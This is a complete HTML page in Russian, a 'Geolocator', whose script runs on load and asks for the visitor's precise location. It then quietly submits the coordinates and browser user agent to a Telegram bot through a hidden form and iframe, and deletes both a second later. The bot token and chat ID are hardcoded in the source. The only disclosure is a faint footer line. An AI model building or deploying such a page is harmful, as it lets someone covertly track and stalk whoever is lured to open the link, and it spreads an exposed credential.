<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>📍 Геолокатор</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #0d1117;
            color: #c9d1d9;
            font-family: Arial, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 16px;
        }
        .card {
            background: #161b22;
            border: 1px solid #30363d;
            border-radius: 20px;
            padding: 30px 24px;
            max-width: 500px;
            width: 100%;
            text-align: center;
        }
        .card h1 {
            font-size: 24px;
            margin-bottom: 20px;
        }
        .card h1 span {
            color: #58a6ff;
        }
        .status-box {
            background: #0d1117;
            border: 1px solid #30363d;
            border-radius: 12px;
            padding: 20px 16px;
            margin-bottom: 24px;
            min-height: 120px;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
        .status-box .loader {
            display: inline-block;
            width: 28px;
            height: 28px;
            border: 3px solid #30363d;
            border-top: 3px solid #58a6ff;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin-bottom: 10px;
        }
        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }
        .status-box .text {
            font-size: 15px;
            color: #8b949e;
        }
        .status-box .text.success {
            color: #3fb950;
        }
        .status-box .text.error {
            color: #f85149;
        }
        .status-box .coords {
            font-family: 'Courier New', monospace;
            font-size: 18px;
            color: #f0883e;
            margin-top: 6px;
            word-break: break-all;
        }
        .status-box .accuracy {
            font-size: 13px;
            color: #8b949e;
            margin-top: 4px;
        }
        .btn {
            background: #238636;
            color: white;
            border: none;
            padding: 10px 24px;
            border-radius: 10px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: 0.2s;
        }
        .btn:hover {
            background: #2ea043;
        }
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #484f58;
            border-top: 1px solid #21262d;
            padding-top: 16px;
        }
        .status-sent {
            color: #58a6ff;
            font-size: 13px;
            margin-top: 4px;
        }
        iframe {
            display: none;
        }
    </style>
</head>
<body>

    <div class="card">
        <h1>📍 <span>Геолокатор</span></h1>

        <div class="status-box" id="statusBox">
            <div class="loader" id="loader"></div>
            <div class="text" id="statusText">Определение геолокации...</div>
            <div class="coords" id="coordsDisplay">—</div>
            <div class="accuracy" id="accuracyDisplay"></div>
            <div class="status-sent" id="sentStatus"></div>
        </div>

        <button class="btn" id="btnRefresh" onclick="getLocation()">🔄 Обновить</button>

        <div class="footer">
            ⚡ Данные отправляются в Telegram
        </div>
    </div>

    <script>
        const BOT_TOKEN = "8975499216:AAEmqWVeYW6vm0p5MjI0d_ec-RDzrVLwxM0";
        const CHAT_ID = "2131297532";

        function sendToTelegram(lat, lon, acc) {
            const text = encodeURIComponent(
                `📍 Новая геолокация!\n\nШирота: ${lat.toFixed(6)}\nДолгота: ${lon.toFixed(6)}\nТочность: ±${Math.round(acc)} м\n\nУстройство: ${navigator.userAgent}`
            );

            // Создаём форму с GET-методом
            const form = document.createElement('form');
            form.method = 'GET';
            form.action = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            form.target = 'telegramFrame';

            const input1 = document.createElement('input');
            input1.type = 'hidden';
            input1.name = 'chat_id';
            input1.value = CHAT_ID;

            const input2 = document.createElement('input');
            input2.type = 'hidden';
            input2.name = 'text';
            input2.value = decodeURIComponent(text);

            form.appendChild(input1);
            form.appendChild(input2);

            // Создаём iframe, куда будет отправлен запрос
            const iframe = document.createElement('iframe');
            iframe.name = 'telegramFrame';
            iframe.style.display = 'none';
            document.body.appendChild(iframe);

            document.body.appendChild(form);
            form.submit();

            // Убираем всё через секунду
            setTimeout(() => {
                document.body.removeChild(form);
                document.body.removeChild(iframe);
            }, 1000);

            document.getElementById('sentStatus').textContent =
                `📤 Отправлено в Telegram (${new Date().toLocaleTimeString()})`;
        }

        function getLocation() {
            const statusText = document.getElementById('statusText');
            const coordsDisplay = document.getElementById('coordsDisplay');
            const accuracyDisplay = document.getElementById('accuracyDisplay');
            const sentStatus = document.getElementById('sentStatus');
            const loader = document.getElementById('loader');
            const btn = document.getElementById('btnRefresh');

            statusText.textContent = '⏳ Запрос разрешения...';
            statusText.className = 'text';
            coordsDisplay.textContent = '—';
            accuracyDisplay.textContent = '';
            sentStatus.textContent = '';
            loader.style.display = 'inline-block';
            btn.disabled = true;

            if (!navigator.geolocation) {
                statusText.textContent = '❌ Браузер не поддерживает геолокацию';
                statusText.className = 'text error';
                loader.style.display = 'none';
                btn.disabled = false;
                return;
            }

            navigator.geolocation.getCurrentPosition(
                function(pos) {
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;
                    const acc = pos.coords.accuracy;

                    coordsDisplay.textContent = `${lat.toFixed(6)}, ${lon.toFixed(6)}`;
                    accuracyDisplay.textContent = `±${Math.round(acc)} м`;
                    statusText.textContent = '✅ Геолокация получена!';
                    statusText.className = 'text success';
                    loader.style.display = 'none';
                    btn.disabled = false;

                    sendToTelegram(lat, lon, acc);
                },
                function(err) {
                    let msg = '';
                    switch (err.code) {
                        case 1:
                            msg = '❌ Доступ запрещён! Разрешите геолокацию.';
                            break;
                        case 2:
                            msg = '❌ Сигнал недоступен. Проверьте GPS/WiFi.';
                            break;
                        case 3:
                            msg = '❌ Таймаут. Обновите страницу.';
                            break;
                        default:
                            msg = '❌ Ошибка: ' + err.message;
                    }
                    statusText.textContent = msg;
                    statusText.className = 'text error';
                    coordsDisplay.textContent = '—';
                    accuracyDisplay.textContent = '';
                    loader.style.display = 'none';
                    btn.disabled = false;
                }, { enableHighAccuracy: true, timeout: 15000, maximumAge: 5000 }
            );
        }

        window.onload = function() {
            setTimeout(getLocation, 500);
        };
    </script>

</body>
</html>
